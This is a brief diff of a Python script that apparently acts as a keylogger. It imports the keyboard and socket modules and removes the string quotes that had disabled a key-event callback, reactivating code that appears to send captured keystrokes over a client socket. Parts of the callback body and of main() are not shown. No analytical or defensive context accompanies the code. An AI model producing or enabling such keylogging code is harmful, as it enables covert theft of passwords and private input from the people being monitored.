@@ -1,7 +1,6 @@
 import keyboard
 import socket
 
-"""
 def on_key_event(client_socket):
     def callback(e):
         if e.event_type == keyboard.KEY_DOWN:
@@ -11,7 +10,6 @@ def on_key_event(client_socket):
             keyboard.unhook_all_hotkeys()
 
     return callback
-"""
 
 def main():
     # Set up the server
